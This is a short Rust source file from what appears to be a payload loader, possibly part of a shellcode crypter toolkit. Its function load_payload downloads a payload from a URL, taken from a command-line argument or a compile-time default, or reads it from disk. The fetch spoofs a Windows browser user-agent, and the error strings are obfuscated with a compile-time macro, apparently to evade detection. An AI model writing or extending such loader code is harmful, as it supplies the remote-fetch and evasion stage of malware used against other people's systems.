use std::env;
use rustcrypt_ct_macros::obf_lit;

pub fn load_payload() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    let address = if args.len() < 2 || args[1].is_empty() {
        // 使用编译时配置的默认地址
        env!("RSL_DEFAULT_PAYLOAD_ADDRESS").to_string()
    } else {
        args[1].clone()
    };

    if address.starts_with("http://") || address.starts_with("https://") {
        // Remote loading with user-agent spoofing
        let response = minreq::get(&address)
            .with_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .send()?;

        if response.status_code < 200 || response.status_code >= 300 {
            return Err(format!("{} {}", obf_lit!("Network error:"), response.status_code).into());
        }
        Ok(response.as_bytes().to_vec())
    } else {
        // Local file loading with existence check
        let path = std::path::Path::new(&address);
        if !path.exists() {
            return Err(format!("{} {}", obf_lit!("Resource unavailable:"), path.display()).into());
        }

        Ok(std::fs::read(&address)?)
    }
}